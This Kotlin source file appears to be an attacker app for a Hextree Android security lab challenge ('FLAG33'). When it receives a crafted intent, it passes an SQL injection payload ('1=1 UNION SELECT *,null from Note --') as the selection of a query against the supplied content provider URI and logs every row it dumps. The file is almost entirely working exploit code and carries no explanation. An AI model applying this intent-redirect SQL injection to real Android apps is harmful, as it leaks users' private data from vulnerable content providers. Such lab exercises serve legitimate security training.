package io.ks.intentatk

import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity

class RecvIntent33 : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Handle the incoming intent with the action
        val action = intent?.action
        if (action == "io.hextree.FLAG33") {
            Log.i("yeet", intent.toString())
            val contentUri = intent.data
            val sqlquery = "1=1 UNION SELECT *,null from Note --"

            if (contentUri != null) {
                contentResolver.query(contentUri, null, sqlquery, null, null)?.use { cursor ->
                    if (cursor.moveToFirst()) {
                        val sb = StringBuilder()
                        do {
                            for (i in 0 until cursor.columnCount) {
                                if (i > 0) sb.append(", ")
                                sb.append("${cursor.getColumnName(i)} = ${cursor.getString(i)}")
                            }
                            sb.append("\n")
                        } while (cursor.moveToNext())
                        Log.i("yeet",sb.toString())
                    }
                }
            }

        }

        // Finish the activity after setting the result
        finish()
    }

}
